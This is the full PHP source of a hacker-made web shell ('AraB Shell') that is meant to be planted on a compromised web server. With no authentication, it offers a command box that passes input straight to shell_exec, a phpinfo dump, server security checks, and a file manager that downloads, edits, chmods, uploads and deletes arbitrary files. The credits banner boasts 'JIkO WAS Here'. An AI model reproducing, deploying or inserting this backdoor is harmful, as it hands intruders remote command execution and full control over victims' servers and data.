
<?php

/*
--------------------------------------------------------------------
                           JIKO FroM JIKI TEAm
	coded By JIKO for all Hackers arab [Muslim]
	Web Site: WwW.No-BaCk.OrG
	Email : JAlikom@hotmail.CoM
	Greetz : all my friend and Kil1er & H-T Team and all No-back members and tryag.Com
--------------------------------------------------------------------
*/
//download Files  Code
$fdownload=$_GET['fdownload'];
if ($fdownload <> "" ){
// path & file name
$path_parts = pathinfo("$fdownload");
$entrypath=$path_parts["basename"];
$name = "$fdownload";
$fp = fopen($name, 'rb');
header("Content-Disposition: attachment; filename=$entrypath");
header("Content-Length: " . filesize($name));
fpassthru($fp);
exit;
}
?>
<html> 
<head><title>jawa V~ Shell</title></head>
<style> 
BODY { SCROLLBAR-BASE-COLOR: #191919; SCROLLBAR-ARROW-COLOR: #008080; } 
a{color:#dadada;text-decoration:none;font-family:tahoma;font-size:13px}
a:hover{color:#008080}
input{FONT-WEIGHT:normal;background-color: #191919;font-size: 12px; color: #dadada; font-family: Tahoma; border: 1px solid #666666;height:17}
textarea{background-color:#191919;color:#dadada;font-weight:bold;font-size: 12px;font-family: Tahoma; border: 1 solid #666666;}
div{font-size:12px;font-family:tahoma;font-weight:normal;color:whitesmoke}
select{background-color: #191919; font-size: 12px; color: #dadada; font-family: Tahoma; border: 1 solid #666666;font-weight:bold;}</style> 
<body bgcolor=black text=white><font face="sans ms" size=3> 
</body> 
</html> 

<table bgcolor="#1E1E1E" style="border:1px white solid" width="100%" height="40"><tr><td>
<div align="center"><font face="tahoma" size="5" color="white">&laquo;&sect;&infin; AraB Shell &infin;&sect;&raquo;</font></div>
<div align="center"><font face="tahoma" size="2" color="white"> coded By JIKO From Maroc </font></div>
</table>
<body bgcolor="black"><pre>
</table>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse"  width="100%" id="AutoNumber1">
 
 <tr>
    <td width="100%">
    <p align="center"><b>
				<font face="Tahoma" size="2"><br>
				</font>
				<font color="#D2D200" face="Tahoma" size="2">
				<span style="text-decoration: none">
				<font color="#000000">
				<a href="?id=fm&dir=<?
	echo getcwd();
	?>
	">
				<span style="text-decoration: none"><font color="#FFFFFF"> .:File Manager:.</font></span></a></font></span></font></b>
				<b>
				<a href="?id=cmd">
				<span style="text-decoration: none"><font color="#FFFFFF">.:CMD:.</font></span></a></font></b>
				<b>			
				<font face="Tahoma" size="2" color="#FFFFFF">
				<a href="?id=info">
				<span style="text-decoration: none"><font color="#FFFFFF">.:INFO:.</font></span></a></font></b>
				<b>
				<font face="Tahoma" size="2" color="#FFFFFF">
				<a href="?id=sys">
				<span style="text-decoration: none"><font color="#FFFFFF">.:Server:.</font></span></a></font></b>
				<b>
				<font color="#000000" face="Tahoma" size="2">
				<a href="?id=">
				<span style="text-decoration: none"><font color="#FFFFFF">.:About:.</font></span></a></font></b></p>
				
    </td>
  </tr>
  <tr>
    <td width="100%">
    

<?

			//*******************************************************
			//Start Programs About US
			$id=$_GET['id'];

			if ($id=="") {
			echo "<center>
			<font face='Arial Black' color='#FFFFFF' size='1'>
***************************************************************************<br>
&nbsp;Arab Hackers : WWW.Tryag.COM  & WWW.no-back.org<br>
&nbsp;codec : jiko From Maroc <br>
&nbsp;Team : Jiki TEAM [maroc - yamen Hacker]  <br>
&nbsp;Note : Troops Of mohamed comming Inchalah  <br>
&nbsp;e-mail : jalikom(at)hotmail(dot)com<br>
&nbsp; greetz : Kil1er and Tryag Team and H-T Team and V4 Team and all friends <br>
&nbsp; Info : For more information Visit Www.no-back.org Or Tryag.com <br>
***************************************************************************<br>
&nbsp; <h3> JIkO WAS Here </h3>
</font></span></p>
";

echo "<font color='#000000' size='2'>OS :". php_uname();
echo "<br>IP :". 
($_SERVER['REMOTE_ADDR']);
echo "</font>";
echo "</tr>";

			}
error_reporting(E_ERROR | E_WARNING | E_PARSE);
 //server information
 if($id=="sys"){
 echo '<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
  <tr>
    <td width="100%">
    
<center>OS:</font><font color=\"#DCE7EF\" size=\"-2\" face=\"verdana\"><font size=\"1\" face=\"Arial\">&nbsp;';  echo php_uname(); echo '&nbsp;</font></span></font></font></a></font></b></p>
        <font size=\"2px\">
        <a bookmark=\"minipanel\" style=\"font-weight: normal; color: #dadada; font-family: verdana; text-decoration: none\">
        <font size=\"2px\" face=\"verdana\" color=\"white\"><p align=\"center\">
<font size=\"1\" face=\"Verdana\" color=\"#008000\"><b>Server</b>:</font>&nbsp;';  echo (htmlentities($_SERVER['SERVER_SOFTWARE'])); echo '&nbsp;</font></font> </a>
</font>';

$tymczas="./"; // Set $tymczas to dir where you have 777 like /var/tmp

if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "<font color=\"red\">ON (secure)</font>";
}
else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
echo("Safe-mode: $hsafemode");
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$v."</font>";}
else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";}
echo(".     /    .");
echo("Open base dir: $hopenbasedir");
echo("&nbsp;&nbsp;");
echo "<br>Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
$free = @diskfreespace($dir);
if (!$free) {$free = 0;}
$all = @disk_total_space($dir);
if (!$all) {$all = 0;}
$used = $all-$free;
$used_percent = @round(100/($all/$free),2);
echo"
    </td>
  </tr>
</table>";
 }
 //File Edit
 $fedit=$_GET['fedit'];
 if ($fedit <> "" ){
 $fedit=realpath($fedit);
 $lines = file($fedit);
 echo "<form action='' method='POST'>";
echo "<textarea name='savefile' rows=30 cols=80>" ;
foreach ($lines as $line_num => $line) {
 echo htmlspecialchars($line);
}
echo "</textarea>
	<input type='text' name='filepath'  size='60' value='$fedit'>
	<input type='submit' value='save'></form>";
	$savefile=$_POST['savefile'];
	$filepath=realpath($_POST['filepath']);
	if ($savefile <> "") 
	{
	$fp=fopen("$filepath","w+");
	fwrite ($fp,"") ;
	fwrite ($fp,$savefile) ;
	fclose($fp);
	echo "<script language='javascript'> close()</script>";
	}
exit();
 }
// CHmod - Pirmission
$fchmod=$_GET['fchmod'];
if ($fchmod <> "" ){
$fchmod=realpath($fchmod);
echo "<center><br>
chmod for :$fchmod<br>
<form method='POST' action=''><br>
Chmod :<br>
<input type='text' name='chmod0' ><br>
<input type='submit' value='change chmod'>
</form>";
$chmod0=$_POST['chmod0'];
if ($chmod0 <> ""){
chmod ($fchmod , $chmod0);
}else {
echo "primission Not Allow change Chmod";
}
exit();
}
//command 
			$cmd=$_POST['cmd'];
			if($id=="cmd"){
		$result=shell_exec("$cmd");
		echo "<br><center><h3> CMD ExeCute </h3></center>" ;
		echo "<center>
		<textarea rows=20 cols=70 >$result</textarea><br>
		<form method='POST' action=''>
		<input type='hidden' name='id' value='cmd'>
		<br><input type='text' size='80' name='cmd' value='$cmd'>
		<br><br><input type='submit' value='cmd'><br><br>";
			
			
			
			}
			
		//********************************************************	
		
		//info server
		if ( $id=="info"){
		
		phpinfo();
		}
		//********************************************************
			//file manger see result
			$homedir=getcwd();
			$dir=realpath($_GET['dir'])."/";
			if ($id=="fm"){
			echo "<br><b><p align='left'>&nbsp;Home:</b> $homedir 
                  &nbsp;<b>
                  <form action='' method='GET'>
                  &nbsp;Path:</b>
                  <input type='hidden' name='id' value='fm'>
                  <input type='text' name='dir' size='80' value='$dir'>
                  <input type='submit' value='dir'>
                  </form>
                 <br>";

			echo "

<div align='center'>

<table border='1' id='table1' style='border: 1px #333333' height='90' cellspacing='0' cellpadding='0'>
	<tr>
		<td width='300' height='30' align='left'><b><font size='2'>File / Folder Name</font></b></td>
		<td height='28' width='82' align='center'>
		<font color='#000080' size='2'><b>Size KByte</b></font></td>
		<td height='28' width='83' align='center'>
		<font color='#008000' size='2'><b>Download</b></font></td>
		<td height='28' width='66' align='center'>
		<font color='#FF9933' size='2'><b>Edit</b></font></td>
		<td height='28' width='75' align='center'>
		<font color='#999999' size='2'><b>Chmod</b></font></td>
		<td height='28' align='center'><font color='#FF0000' size='2'><b>Delete</b></font></td>
	</tr>";
		    if (is_dir($dir)){
		    if ($dh=opendir($dir)){
		    while (($file = readdir($dh)) !== false) {
		    $fsize=round(filesize($dir . $file)/1024);
		
		    
	echo " 
	<tr>
		<th width='250' height='22' align='left' nowrap>";
		if (is_dir($dir.$file))
		{
		echo "<a href='?id=fm&dir=$dir$file'><span style='text-decoration: none'><font size='2' color='#666666'>&nbsp;$file <font color='#FF0000' size='1'>dir</font>";
		}
		else {
		echo "<font size='2' color='#666666'>&nbsp;$file ";
		}
		echo "</a></font></th>
		<td width='113' align='center' nowrap><font color='#000080' size='2'><b>";
		if (is_file($dir.$file))
		{
		echo "$fsize";
		}
		else {
		echo "&nbsp; ";
		}
		echo "
		</b></font></td>
		<td width='103' align='center' nowrap>";
		if (is_file($dir.$file)){
		if (is_readable($dir.$file)){
		echo "<a href='?id=fm&fdownload=$dir$file'><span style='text-decoration: none'><font size='2' color='#008000'>download";
		}else {
		echo "<font size='1' color='#FF0000'><b>No ReadAble</b>";
		 }
		}else {
		echo "&nbsp;";
		 }
		echo "
		</a></font></td>
		<td width='77' align='center' nowrap>";
		if (is_file($dir.$file))
		{
		if (is_readable($dir.$file)){
		echo "<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decoration: none'><font color='#FF9933' size='2'>Edit";
		}else {
		echo "<font size='1' color='#FF0000'><b>No ReadAble</b>";
		 }
		}else {
		echo "&nbsp;";
		 }
		echo "
		</a></font></td>
		<td width='86' align='center' nowrap>";
		if (strtoupper(substr(PHP_OS, 0, 3)) === '') {
		echo "<font size='1' color='#999999'>Dont in windows";
		}
		else {
		echo "<a href='?id=fm&fchmod=$dir$file'><span style='text-decoration: none'><font size='2' color='#999999'>Chmod";
		}
		echo "</a></font></td>
		<td width='86'align='center' nowrap><a href='?id=fm&fdelete=$dir$file'><span style='text-decoration: none'><font size='2' color='#FF0000'>Delete</a></font></td>
	</tr>
	";
		      }
		      closedir($dh);
		    } 
		    }
		    echo "</table>
<form enctype='multipart/form-data' action='' method='POST'>
 <input type='hidden' name='MAX_FILE_SIZE'  />
 Send this file: <input name='userfile' type='file' />
 <inpt type='hidden' name='Fupath'  value='$dir'>
 <input type='submit' value='Send File' />
</form> 
		    </div>";
			}
//Upload Files 
$rpath=$_GET['dir'];
if ($rpath <> "") {
$uploadfile = $rpath."/" . $_FILES['userfile']['name'];
print "<pre>";
if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
echo "<script language='javascript'> alert('\:D Successfully uploaded.!')</script>";
echo "<script language='javascript'> history.back(2)</script>";
}
 }
  //file deleted
$frpath=$_GET['fdelete'];
if ($frpath <> "") {
if (is_dir($frpath)){
$matches = glob($frpath . '/*.*');
if ( is_array ( $matches ) ) {
  foreach ( $matches as $filename) {
  unlink ($filename);
  rmdir("$frpath");
echo "<script language='javascript'> alert('Success! Please refresh')</script>";
echo "<script language='javascript'> history.back(1)</script>";
  }
  }
  }
  else{
echo "<script language='javascript'> alert('Success! Please refresh')</script>";
unlink ("$frpath");
echo "<script language='javascript'> history.back(1)</script>";
exit(0);

  }
  

}

?>